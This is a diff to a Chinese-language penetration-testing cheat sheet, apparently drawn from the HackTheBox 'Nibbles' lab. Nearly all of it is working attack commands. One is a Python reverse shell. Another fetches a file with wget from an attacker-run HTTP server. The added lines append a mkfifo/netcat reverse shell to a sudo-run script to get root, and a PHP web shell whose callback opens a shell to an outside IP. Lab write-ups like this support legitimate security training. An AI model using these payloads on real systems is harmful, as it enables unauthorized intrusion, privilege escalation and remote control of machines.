@@ -151,6 +151,17 @@ sudo nc -nvlp 1111
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.2",1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
+```
+nibbler@Nibbles:/home/nibbler/personal/stuff$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.154 8083 > /tmp/f" >> monitor.sh
+< /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.154 8083 > /tmp/f" >> monitor.sh
+nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
+```
+
+```
+root@kali:~/hackthebox/nibbles-10.10.10.75# cat callback.php
+<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.154 8082 >/tmp/f"); ?>
+```
+
 ### 远程文件包含获取shell
 
 ```
@@ -159,5 +170,7 @@ sudo python3 -m http.server 80 //shell文件放在开启该命令的文件夹下
 受害服务器：
 wget 10.10.16.2/new.py
 ```
+### 冰蝎联动msf获取反弹shell
 
+https://blog.csdn.net/weixin_45745344/article/details/112321742
 
